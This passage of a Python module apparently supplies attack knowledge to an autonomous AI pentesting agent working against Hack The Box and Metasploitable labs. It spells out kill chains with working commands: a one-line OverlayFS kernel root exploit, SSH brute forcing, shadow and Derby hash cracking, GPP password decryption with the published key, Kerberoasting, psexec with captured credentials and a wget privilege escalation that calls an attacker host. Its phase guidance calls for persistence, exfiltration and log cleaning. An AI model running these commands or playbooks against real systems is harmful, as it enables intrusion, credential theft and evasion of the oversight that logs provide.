                          "Extract credentials from container environment variables",
                          "Docker containers store secrets as env vars. Look for META_PASS, DB_PASSWORD, etc.",
                          "META_PASS=An4lytics_ds20223#", "PASS"),
            KillChainStep("privilege_escalation", "ssh metalytics@{target} (with env password)",
                          "SSH to host with leaked container credentials",
                          "Container env var password often = host SSH password.",
                          "metalytics@analytics:~$", "metalytics"),
            KillChainStep("privilege_escalation",
                          "unshare -rm sh -c 'mkdir l u w m && cp /u*/b*/p]/*sh l/ && "
                          "mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m && "
                          "touch m/;mkdir -p m/..teleport/resolve && printf '#!/bin/sh\\ncp /bin/sh "
                          "/var/tmp/xxsh\\nchmod 04755 /var/tmp/xxsh' >m/..teleport/resolve && "
                          "chmod a+x m/..teleport/resolve && umount m' && /var/tmp/xxsh -p",
                          "OverlayFS kernel exploit (CVE-2023-2640/CVE-2023-32629)",
                          "Single-command OverlayFS exploit for Ubuntu 22.04 kernels 5.15-6.2.",
                          "root@analytics:#", "root"),
        ),
    ),
    KillChain(
        name="htb_finger_shadow_crack",
        description="Finger enumeration → SSH brute → shadow backup → hash crack → sudo wget root (Sunday)",
        target_profile="generic",
        difficulty="medium",
        reasoning="Legacy services like finger (port 79) enumerate valid users. Shadow backup files "
                  "with weak permissions expose password hashes. GTFOBins sudo abuse for root.",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 79,22022 {target}", "Scan for finger and SSH on non-standard ports",
                          "Port 79 = finger (user enumeration). SSH may be on non-standard ports like 22022.",
                          "79/tcp open finger... 22022/tcp open ssh", "finger"),
            KillChainStep("enumeration", "finger @{target} && finger root@{target} && finger admin@{target}",
                          "Enumerate valid usernames via finger service",
                          "Finger reveals logged-in users and valid accounts. Build username list for brute force.",
                          "sunny... sammy...", "sunny"),
            KillChainStep("exploitation", "hydra -l sunny -P /usr/share/wordlists/rockyou.txt ssh://{target}:22022",
                          "Brute force SSH with discovered usernames",
                          "Use hydra with discovered usernames against SSH.",
                          "sunny:sunday", "sunday"),
            KillChainStep("privilege_escalation", "cat /backup/shadow.backup",
                          "Read shadow backup file with weak permissions",
                          "Backup copies of /etc/shadow may have weaker permissions than the original.",
                          "sammy:$6$...", "sammy"),
            KillChainStep("privilege_escalation", "john --wordlist=rockyou.txt shadow.backup",
                          "Crack shadow hashes offline",
                          "John the Ripper with rockyou.txt cracks weak passwords quickly.",
                          "sammy:cooldude!", "cooldude"),
            KillChainStep("privilege_escalation", "sudo wget --use-askpass=<script> http://attacker/",
                          "GTFOBins: sudo wget --use-askpass for root",
                          "wget with --use-askpass executes an arbitrary program to get the password. "
                          "This can be abused to run commands as root.",
                          "root@sunday:#", "root"),
        ),
    ),
    KillChain(
        name="htb_ofbiz_derby_hash_crack",
        description="Apache OFBiz CVE-2023-49070 → shell → Derby DB hash extraction → su root (Bizness)",
        target_profile="generic",
        difficulty="medium",
        reasoning="Enterprise Java applications store credentials in embedded databases. Extract hashes "
                  "from raw database files, identify the hash format, and crack for password reuse to root.",
        total_expected_reward=400.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 80,443 {target}", "Scan for HTTPS web services",
                          "OFBiz and similar enterprise apps often run on HTTPS.",
                          "443/tcp open ssl/http nginx", "nginx"),
            KillChainStep("enumeration", "gobuster dir -u https://{target} -k -w raft-medium-directories.txt",
                          "Find hidden admin paths",
                          "Look for /accounting, /webtools, /control, /admin paths.",
                          "/accounting/control/main", "accounting"),
            KillChainStep("exploitation", "Exploit CVE-2023-49070 (OFBiz XML-RPC pre-auth RCE)",
                          "Pre-auth RCE via XML-RPC deserialization",
                          "Apache OFBiz ≤18.12 has pre-auth RCE via XML-RPC. Use ysoserial payload.",
                          "ofbiz@target:$", "ofbiz"),
            KillChainStep("privilege_escalation",
                          "find /opt/ofbiz -name '*.dat' -exec grep -l 'password\\|hash' {} \\;",
                          "Search Derby database files for password hashes",
                          "Derby stores data in .dat files. grep for SHA1/bcrypt/MD5 patterns.",
                          "seg0/c180.dat", "dat"),
            KillChainStep("privilege_escalation",
                          "Extract SHA1 hash → python3 decode_base64_salt → hashcat -m 120",
                          "Decode and crack the extracted hash",
                          "Derby may store passwords as SHA1(salt+password) in base64. Decode, identify "
                          "format, and crack with hashcat mode 120 (sha1($salt.$pass)).",
                          "monkeybizness", "monkey"),
            KillChainStep("privilege_escalation", "su root (with cracked password)",
                          "Switch to root with cracked password",
                          "Application admin passwords are often reused as system root passwords.",
                          "root@Bizness:#", "root"),
        ),
    ),
    KillChain(
        name="htb_ad_gpp_kerberoast",
        description="SMB Replication share → GPP cPassword → Kerberoasting → Admin hash → psexec (Active)",
        target_profile="generic",
        difficulty="medium",
        reasoning="Active Directory Group Policy Preferences store AES-encrypted passwords in SYSVOL. "
                  "Microsoft published the key, so ALL GPP passwords are trivially decryptable. Use "
                  "the decrypted creds to Kerberoast service accounts and crack their hashes for admin.",
        total_expected_reward=500.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 88,135,139,389,445 {target}", "Scan for AD services",
                          "Kerberos(88), RPC(135), SMB(139,445), LDAP(389) = Active Directory Domain Controller.",
                          "88/tcp open kerberos... 445/tcp open microsoft-ds", "kerberos"),
            KillChainStep("enumeration", "smbclient -N -L //{target} → smbclient //{target}/Replication",
                          "List SMB shares — access Replication/SYSVOL anonymously",
                          "SYSVOL/Replication shares often allow anonymous read. Look for Groups.xml.",
                          "Groups.xml", "Groups"),
            KillChainStep("exploitation",
                          "cat Groups.xml → extract cPassword → gpp-decrypt <hash>",
                          "Decrypt GPP cPassword from Groups.xml",
                          "Microsoft AES key for GPP: 4e 99 06 e8 fc b6 6c ce 9f b8 85 03 82 04 28 86. "
                          "gpp-decrypt handles this automatically. Gets SVC_TGS credentials.",
                          "SVC_TGS:GPPstillStandingStrong2k18", "SVC_TGS"),
            KillChainStep("exploitation",
                          "GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -dc-ip {target}",
                          "Kerberoast: Request TGS for service accounts",
                          "With valid domain credentials, request TGS tickets. These are encrypted with "
                          "the service account's NTLM hash and crackable offline.",
                          "$krb5tgs$23$*Administrator*...", "krb5tgs"),
            KillChainStep("privilege_escalation",
                          "hashcat -m 13100 tgs_hash.txt rockyou.txt",
                          "Crack Kerberos TGS hash → Administrator password",
                          "Kerberos TGS hashes crack fast with hashcat mode 13100.",
                          "Administrator:Ticketmaster1968", "Ticketmaster"),
            KillChainStep("post_exploitation",
                          "psexec.py active.htb/Administrator:Ticketmaster1968@{target}",
                          "PsExec as Domain Administrator",
                          "Full domain compromise via psexec with admin credentials.",
                          "nt authority\\system", "system"),
        ),
    ),
    KillChain(
        name="htb_js2py_sqlite_backup",
        description="Flask js2py sandbox escape → SQLite hash dump → SSH → sudo backup tool root (CodePartTwo)",
        target_profile="generic",
        difficulty="medium",
        reasoning="Web apps using js2py to evaluate user JavaScript are vulnerable to Python sandbox "
                  "escape. Application databases contain user hashes. Backup tools with sudo and "
                  "configurable paths can be abused to read /root.",
        total_expected_reward=350.0,
        steps=(
            KillChainStep("recon", "nmap -sV -p 22,8000 {target}", "Scan for SSH and web app",
                          "Gunicorn/Flask on high ports is common for Python web apps.",
                          "22/tcp open ssh... 8000/tcp open http Gunicorn", "Gunicorn"),
            KillChainStep("enumeration", "Download app.zip → check requirements.txt for js2py version",
                          "Identify vulnerable dependencies",
                          "requirements.txt reveals exact versions. js2py 0.74 = CVE-2024-28397 sandbox escape.",
                          "js2py==0.74", "js2py"),
            KillChainStep("exploitation",
                          "Submit CVE-2024-28397 payload via code editor → sandbox escape → RCE",
                          "js2py sandbox escape → Python subprocess.Popen",
                          "Navigate Python MRO from JavaScript: Object → __class__ → __base__ → __subclasses__ "
                          "→ find subprocess.Popen → execute arbitrary commands.",
                          "app@target:$", "app@"),
            KillChainStep("privilege_escalation",
                          "sqlite3 instance/users.db 'SELECT * FROM user' → CrackStation MD5",
                          "Extract and crack user password hashes from SQLite",
                          "Application databases contain user hashes. MD5 hashes crack instantly online.",
                          "marco:sweetangelbabylove", "sweet"),
            KillChainStep("privilege_escalation", "ssh marco@{target}",
                          "SSH with cracked database credentials",
                          "Cracked app password = SSH password (password reuse).",
                          "marco@codeparttwo:~$", "marco@"),
            KillChainStep("privilege_escalation",
                          "sudo -l → modify npbackup config to backup /root → sudo npbackup-cli -c custom -b",
                          "Abuse sudo backup tool to read /root",
                          "Modify backup config to target /root directory. Restore backup to read root flag.",
                          "root.txt", "root"),
        ),
    ),
]


# =============================================================================
# HTB WALKTHROUGH-DERIVED CVEs (Phase 7.0 — extracted by Claude from 15 walkthroughs)
# =============================================================================

HTB_CVES: List[CVEEntry] = [
    CVEEntry("CVE-2023-38646", "Metabase", "Pre-auth RCE via setup-token and JDBC H2 payload",
             "Manual: GET /api/session/properties → POST /api/setup/validate",
             "root shell", "Setup-token leak + H2 DB JDBC allows arbitrary command execution (Analytics box)"),
    CVEEntry("CVE-2023-2640", "Linux Kernel (OverlayFS)", "Ubuntu local privilege escalation via OverlayFS",
             "Single-command exploit using unshare + overlay mount",
             "root", "Ubuntu 22.04 kernels 5.15-6.2 have OverlayFS bug allowing cap_setuid bypass (Analytics)"),
    CVEEntry("CVE-2023-32629", "Linux Kernel (OverlayFS)", "Ubuntu OverlayFS privesc (companion to CVE-2023-2640)",
             "Combined with CVE-2023-2640 for reliable exploit",
             "root", "OverlayFS permission checking flaw in Ubuntu kernels (Analytics)"),
    CVEEntry("CVE-2023-0386", "Linux Kernel (OverlayFS/FUSE)", "OverlayFS/FUSE local privilege escalation",
             "Compile OverlayFS exploit for target kernel",
             "root", "Generic Linux kernel vuln, broader than Ubuntu-specific CVE-2023-2640 (TwoMillion)"),
    CVEEntry("CVE-2023-30253", "Dolibarr CRM", "PHP code injection in Dolibarr 17.0.0",
             "python3 exploit.py http://target admin admin LHOST LPORT",
             "www-data shell", "PHP code injection bypasses restrictions in Dolibarr ERP/CRM (BoardLight)"),
    CVEEntry("CVE-2022-37706", "Enlightenment DE", "SUID privilege escalation in Enlightenment window manager",
             "./exploit.sh (pre-built PoC)", "root",
             "Enlightenment SUID binary has path traversal allowing arbitrary root code execution (BoardLight)"),
    CVEEntry("CVE-2023-49070", "Apache OFBiz", "Pre-auth RCE via XML-RPC deserialization in OFBiz ≤18.12",
             "ysoserial payload via XML-RPC endpoint",
             "application shell", "XML-RPC endpoint deserializes untrusted Java objects (Bizness)"),
    CVEEntry("CVE-2023-27163", "Request Baskets", "SSRF in Request Baskets ≤1.2.1",
             "Create basket with forward_url pointing to internal services",
             "internal access", "Basket forwarding allows SSRF to reach filtered/internal services (Sau)"),
    CVEEntry("CVE-2014-0160", "OpenSSL (Heartbleed)", "Memory leak in OpenSSL TLS heartbeat extension",
             "nmap --script ssl-heartbleed OR python3 heartbleed.py",
             "info-disclosure", "Leaks 64KB of server memory per request — passwords, keys, sessions (Valentine)"),
    CVEEntry("CVE-2024-28397", "js2py", "Sandbox escape in js2py ≤0.74 allowing arbitrary Python execution",
             "JavaScript payload navigating Python MRO to subprocess.Popen",
             "application shell", "js2py eval_js allows escaping JS sandbox to run Python commands (CodePartTwo)"),
    CVEEntry("CVE-2015-3306", "ProFTPD", "mod_copy unauthenticated file copy in ProFTPD 1.3.5",
             "SITE CPFR /etc/passwd; SITE CPTO /var/www/html/passwd",
             "file write → shell", "mod_copy allows copying files without authentication (MS3 and HTB)"),
    CVEEntry("CVE-2011-2523", "vsftpd", "Backdoor in vsftpd 2.3.4 source distribution",
             "exploit/unix/ftp/vsftpd_234_backdoor",
             "root shell", "Deliberate backdoor: :) in username triggers bind shell on port 6200 (MS2)"),
    CVEEntry("CVE-2007-2447", "Samba", "Username map script command injection in Samba 3.0.20-3.0.25rc3",
             "exploit/multi/samba/usermap_script",
             "root shell", "Shell metacharacters in username trigger command injection (MS2)"),
    CVEEntry("MS11-046", "Windows Kernel", "afd.sys privilege escalation in Windows 7 Build 7600",
             "40564.exe (compiled exploit)",
             "SYSTEM", "AFD driver buffer overflow for kernel-level privesc on Win7/2008 (Devel)"),
]


# =============================================================================
# HTB WALKTHROUGH DECISION RULES — Human-like reasoning patterns
# Extracted from 15 HTB walkthroughs — teaches agents to think like a pentester
# =============================================================================

HTB_DECISION_RULES = [
    # Service recognition → immediate action rules
    {"if": "vsftpd 2.3.4 detected", "then": "exploit backdoor immediately (CVE-2011-2523)",
     "reasoning": "100% reliable instant root. No other enumeration needed.", "priority": 1},
    {"if": "UnrealIRCd 3.2.8.1 detected", "then": "exploit backdoor (Metasploit unreal_ircd_3281_backdoor)",
     "reasoning": "Instant shell via backdoor. Version-specific, extremely reliable.", "priority": 1},
    {"if": "Samba 3.0.20 detected", "then": "exploit usermap_script (CVE-2007-2447)",
     "reasoning": "Pre-auth RCE to root. No credentials needed.", "priority": 1},
    {"if": "port 1524 open", "then": "telnet to port 1524 for instant root",
     "reasoning": "Ingreslock bindshell = free root shell, no exploit needed.", "priority": 1},
    {"if": "r-services (512-514) open", "then": "rsh -l root or rlogin -l root",
     "reasoning": "Trust-based auth with root access. Instant root.", "priority": 1},

    # Web enumeration rules
    {"if": "only port 80 open (besides SSH)", "then": "gobuster directories + ffuf vhost subdomains",
     "reasoning": "Single web port = attack surface is web. Enumerate BOTH directories AND vhosts.", "priority": 2},
    {"if": "HTTP redirects to hostname.htb", "then": "add to /etc/hosts + fuzz subdomains",
     "reasoning": "Virtual hosting means hidden apps on subdomains. ALWAYS fuzz.", "priority": 2},
    {"if": "web app with login page", "then": "try admin:admin, admin:password BEFORE brute force",
     "reasoning": "Default credentials are faster and less noisy than brute force.", "priority": 2},
    {"if": "web app version visible", "then": "searchsploit/Google for CVE",
     "reasoning": "Known version = likely known CVE. Check IMMEDIATELY.", "priority": 2},
    {"if": "sequential IDs in URLs (/data/5, /user/3)", "then": "test IDOR with /data/0, /user/1",
     "reasoning": "IDOR is extremely common and easy to exploit. Always test ID=0.", "priority": 2},

    # Credential hunting rules
    {"if": "shell obtained as www-data", "then": "cat config.php, .env, wp-config.php, conf.php",
     "reasoning": "Web app config files contain DB credentials that are reused for SSH.", "priority": 3},
    {"if": "database access obtained", "then": "dump user table → extract hashes → crack",
     "reasoning": "App user hashes often reuse the system user's password.", "priority": 3},
    {"if": "container/Docker shell obtained", "then": "env | grep -i pass",
     "reasoning": "Container environments leak credentials as environment variables.", "priority": 3},
    {"if": "PCAP/network capture found", "then": "tshark -Y ftp to extract cleartext creds",
     "reasoning": "FTP/Telnet/HTTP transmit credentials in cleartext.", "priority": 3},

    # Privilege escalation rules
    {"if": "linux user shell obtained", "then": "sudo -l && find SUID && getcap && check crontab",
     "reasoning": "Always enumerate ALL privesc vectors before attempting any one.", "priority": 3},
    {"if": "sudo systemctl available", "then": "sudo systemctl status anything → !sh",
     "reasoning": "systemctl pager (less) allows shell escape with !sh.", "priority": 3},
    {"if": "python3 with cap_setuid", "then": "python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
     "reasoning": "cap_setuid on python = instant root. No exploit needed.", "priority": 3},
    {"if": "writable cron script running as root", "then": "replace with reverse shell",
     "reasoning": "Cron will execute the modified script as root on next run.", "priority": 3},
    {"if": "tmux/screen session running as root", "then": "tmux -S /path/to/socket attach",
     "reasoning": "Root sessions with accessible sockets = instant root.", "priority": 3},
    {"if": "kernel version 5.x-6.2 on Ubuntu", "then": "try OverlayFS CVE-2023-2640",
     "reasoning": "Single-command root exploit for modern Ubuntu kernels.", "priority": 3},
    {"if": "Windows whoami /priv shows SeImpersonatePrivilege", "then": "PrintSpoofer or JuicyPotato",
     "reasoning": "Token impersonation = guaranteed SYSTEM on Windows.", "priority": 3},
]


# =============================================================================
# HTB CVE → SERVICE MAPPING (for SmartCoach rapid exploit selection)
# =============================================================================

HTB_CVE_SERVICE_MAP = {
    "Metabase": ["CVE-2023-38646"],
    "Dolibarr": ["CVE-2023-30253"],
    "Apache OFBiz": ["CVE-2023-49070"],
    "Request Baskets": ["CVE-2023-27163"],
    "OpenSSL": ["CVE-2014-0160"],
    "js2py": ["CVE-2024-28397"],
    "ProFTPD 1.3.5": ["CVE-2015-3306"],
    "vsftpd 2.3.4": ["CVE-2011-2523"],
    "Samba 3.0.20": ["CVE-2007-2447"],
    "Enlightenment": ["CVE-2022-37706"],
    "UnrealIRCd 3.2.8.1": ["CVE-2017-2510"],
    "Ubuntu 22.04 kernel 5.15-6.2": ["CVE-2023-2640", "CVE-2023-32629"],
    "Linux kernel OverlayFS": ["CVE-2023-0386"],
    "Windows 7 Build 7600": ["MS11-046"],
    "Maltrail 0.53": ["unauthenticated OS command injection"],
}


PHASE_REASONING = {
    "recon": {
        "why": "Reconnaissance MUST be the first phase because every subsequent decision depends "
               "on knowing what services exist. Without recon, the agent is blind — it cannot "
               "select the right exploit without knowing the target's attack surface.",
        "when_to_advance": "Advance to ENUMERATION when: (1) major ports are discovered, "
                           "(2) at least 3 services are identified by version, (3) the agent has "
                           "a clear picture of the target's OS and service stack.",
        "common_mistake": "Running the same nmap scan repeatedly. One comprehensive scan (-sV -sC -p-) "
                          "is better than five quick scans. The agent should learn: scan ONCE, scan WELL.",
        "phase_commands_reasoning": {
            "nmap_comprehensive": "Best first command. -sV detects versions, -sC runs scripts, -p- scans all ports.",
            "nmap_stealth_scan": "Use when detection avoidance matters. SYN scan (-sS) is quieter than connect scan.",
            "masscan": "When speed matters more than accuracy. Scans 65535 ports in seconds but misses versions.",
        },
    },
    "enumeration": {
        "why": "Enumeration deepens our knowledge of each discovered service. It's the difference "
               "between knowing 'port 80 is open' (recon) and knowing 'port 80 runs WordPress 5.2 "
               "with vulnerable plugin X' (enumeration). Better enumeration = easier exploitation.",
        "when_to_advance": "Advance to EXPLOITATION when: (1) at least one vulnerability is confirmed, "
                           "(2) credentials are discovered, OR (3) a specific exploit module is identified.",
        "common_mistake": "Skipping enumeration to try exploits blindly. The agent should learn that "
                          "5 minutes of enumeration saves 30 minutes of failed exploits.",
    },
    "exploitation": {
        "why": "This is where recon and enumeration pay off. The agent should exploit the EASIEST "
               "vulnerability first (lowest risk, highest probability of success). On MS2, this "
               "means: ingreslock > vsftpd backdoor > Samba > SSH default creds.",
        "when_to_advance": "Advance to PRIVILEGE_ESCALATION when: (1) a shell is obtained, "
                           "(2) we know our current access level (user vs root).",
        "common_mistake": "Trying complex exploits before simple ones. The agent MUST learn: "
                          "simple backdoors and default credentials before Metasploit modules.",
    },
    "privilege_escalation": {
        "why": "User-level access is not enough. Root/SYSTEM access is required to: read all files, "
               "modify system config, access other users' data, and install persistence. Many "
               "MS2 exploits give root directly, but the agent must handle non-root cases too.",
        "when_to_advance": "Advance to POST_EXPLOITATION when: root/SYSTEM access is confirmed.",
        "common_mistake": "Not enumerating privesc vectors before attempting them. Always run "
                          "sudo -l, check SUID, check kernel version BEFORE trying specific exploits.",
    },
    "post_exploitation": {
        "why": "Post-exploitation extracts VALUE from our access. Password hashes, SSH keys, "
               "database dumps, configuration files — these prove the impact of the compromise "
               "and enable lateral movement to other systems.",
        "when_to_advance": "Advance to EXFILTRATION when: (1) shadow hashes are dumped, "
                           "(2) at least one set of credentials is harvested, (3) SSH keys or "
                           "other persistence mechanisms are in place.",
        "common_mistake": "Only dumping /etc/shadow. The agent should also check: MySQL databases, "
                          "web application configs, .bashrc files, SSH keys, cron jobs.",
    },
    "exfiltration": {
        "why": "Exfiltration is the PROOF of compromise. Base64-encoded shadow hashes, downloaded "
               "files, database dumps — these are the deliverables of a penetration test. Without "
               "exfiltration, the engagement has no tangible output.",
        "when_to_advance": "Advance to CLOSEOUT when: (1) sensitive data is extracted, "
                           "(2) evidence of compromise is documented.",
        "common_mistake": "Not encoding data for transfer. Base64 prevents corruption during "
                          "copy-paste or network transfer.",
    },
    "closeout": {
        "why": "Closeout demonstrates PROFESSIONAL MATURITY. A real red team doesn't leave tools, "
               "backdoors, and logs scattered across the target. Cleanup shows operational security "
               "and respect for the client's production environment.",
        "when_complete": "Complete when: (1) all planted artifacts are removed, (2) logs are cleaned, "
                         "(3) target stability is verified, (4) engagement report is generated.",
        "common_mistake": "Skipping cleanup entirely. The agent must learn that closeout is as "
                          "important as exploitation — it differentiates professionals from script kiddies.",
    },
}


# =============================================================================
# Helper functions
# =============================================================================

def get_knowledge_pack(target_profile: str) -> Dict[str, Any]:
    """Get the appropriate knowledge pack for a target profile."""
    if target_profile in ("metasploitable2", "ms2"):
        return {
            "services": MS2_SERVICES,
            "credentials": MS2_CREDENTIALS,
            "cves": MS2_CVES,
            "kill_chains": MS2_KILL_CHAINS,
            "anti_forensics": MS2_ANTI_FORENSICS_KNOWLEDGE,
        }
    elif target_profile in ("metasploitable3", "ms3"):
        return {
            "services": MS3_SERVICES,
            "credentials": MS3_CREDENTIALS,
            "cves": MS3_CVES,
            "kill_chains": MS3_KILL_CHAINS,
        }
    elif target_profile in ("htb", "hackthebox"):
        return {
            "patterns": HTB_COMMON_PATTERNS,
            "kill_chains": HTB_KILL_CHAINS,
            "cves": HTB_CVES,
            "decision_rules": HTB_DECISION_RULES,
            "cve_service_map": HTB_CVE_SERVICE_MAP,
        }
    else:
        return {
            "patterns": HTB_COMMON_PATTERNS,
            "phase_reasoning": PHASE_REASONING,
        }


def get_phase_reasoning(phase: str) -> Dict[str, str]:
    """Get PPO reasoning injection for a specific phase."""
    return PHASE_REASONING.get(phase, {})


def get_all_kill_chains() -> List[KillChain]:
    """Get all kill chains across all knowledge packs."""
    return MS2_KILL_CHAINS + MS3_KILL_CHAINS + HTB_KILL_CHAINS


def get_mentor_knowledge_text(target_profile: str = "metasploitable2") -> str:
    """Generate formatted knowledge text for SmartMentor system prompt injection."""
    lines = []
    
    if target_profile in ("metasploitable3", "ms3"):
        lines.append("\n=== METASPLOITABLE 3 TARGET KNOWLEDGE (Ubuntu 14.04) ===")
        lines.append("MS3 is HARDER than MS2 but has MORE attack vectors. Key differences:")
        lines.append("  • No instant backdoor ports (no ingreslock 1524)")
        lines.append("  • BUT has UnrealIRCd backdoor on 6667 (same as MS2 — instant shell!)")
        lines.append("  • More web services: Jenkins, Elasticsearch, Tomcat, WordPress, Struts")
        lines.append("  • Default creds: vagrant:vagrant (SSH+sudo), sploit:sploit (Tomcat)")
        lines.append("  • ProFTPD 1.3.5 mod_copy for unauthenticated file write\n")
        
        lines.append("MS3 PRIORITY ATTACK ORDER (fastest to slowest):")
        lines.append("  1. UnrealIRCd 6667 backdoor: AB;cmd → instant shell (EASIEST)")
        lines.append("  2. Jenkins /script Groovy console: instant RCE if unauthenticated")
        lines.append("  3. SSH vagrant:vagrant → sudo ALL → root (reliable, simple)")
        lines.append("  4. ProFTPD mod_copy → PHP shell in webroot → RCE")
        lines.append("  5. MySQL root:sploitme → UDF → RCE")
        lines.append("  6. Tomcat sploit:sploit → WAR deploy → shell")
        lines.append("  7. Struts CVE-2017-5638 → OGNL injection → RCE")
        lines.append("  8. Elasticsearch CVE-2014-3120 → dynamic scripting → RCE")
        lines.append("  9. WordPress admin:admin → theme editor → PHP shell\n")
        
        lines.append("VULNERABLE SERVICES:")
        for port, svc in sorted(MS3_SERVICES.items()):
            lines.append(f"  • Port {port} ({svc.service} {svc.version}): {svc.vulnerability}")
            lines.append(f"    EXPLOIT: {svc.exploitation}")
            lines.append(f"    WHY: {svc.reasoning[:150]}")
        
        lines.append("\nDEFAULT CREDENTIALS:")
        for cred in MS3_CREDENTIALS:
            lines.append(f"  • {cred.service} (port {cred.port}): {cred.username}:{cred.password} → {cred.access_level}")
        
        lines.append("\nKEY CVEs:")
        for cve in MS3_CVES:
            lines.append(f"  • {cve.cve_id} ({cve.service}): {cve.description}")
            lines.append(f"    MODULE: {cve.module}")
    
    elif target_profile in ("htb", "hackthebox"):
        lines.append("\n=== HACK THE BOX COMMON PATTERNS (from 15 walkthrough analyses) ===")
        lines.append("HTB boxes follow common patterns. Master these and you solve 80% of boxes.\n")
        
        for pattern_name, pattern in HTB_COMMON_PATTERNS.items():
            if isinstance(pattern, dict) and "techniques" in pattern:
                lines.append(f"\n{pattern_name.upper().replace('_', ' ')}:")
                for tech in pattern["techniques"]:
                    lines.append(f"  • {tech['name']}: {tech['reasoning'][:120]}")
        
        lines.append("\n\n=== HTB CVEs (from walkthrough analysis) ===")
        for cve in HTB_CVES:
            lines.append(f"  • {cve.cve_id} ({cve.service}): {cve.description}")
            lines.append(f"    EXPLOIT: {cve.module}")
        
        lines.append("\n\n=== HTB DECISION RULES (human-like pentester reasoning) ===")
        for rule in sorted(HTB_DECISION_RULES, key=lambda r: r.get("priority", 99)):
            lines.append(f"  IF: {rule['if']}")
            lines.append(f"  THEN: {rule['then']}")
            lines.append(f"  WHY: {rule['reasoning']}")
            lines.append("")
    
    return "\n".join(lines)


def format_service_table(target_profile: str = "metasploitable2") -> str:
    """Format service vulnerability table for display."""
    services = MS2_SERVICES if target_profile in ("metasploitable2", "ms2") else MS3_SERVICES
    
    lines = [f"{'Port':<6} {'Service':<15} {'Vulnerability':<40} {'Impact':<10} {'Difficulty':<10}"]
    lines.append("-" * 90)
    
    for port, svc in sorted(services.items()):
        lines.append(f"{port:<6} {svc.service:<15} {svc.vulnerability[:40]:<40} {svc.impact:<10} {svc.difficulty:<10}")
    
    return "\n".join(lines)


logger.info("Knowledge packs loaded: MS2 (%d services), MS3 (%d services), HTB (%d patterns, %d CVEs, %d kill chains, %d decision rules)",
            len(MS2_SERVICES), len(MS3_SERVICES), len(HTB_COMMON_PATTERNS),
            len(HTB_CVES), len(HTB_KILL_CHAINS), len(HTB_DECISION_RULES))
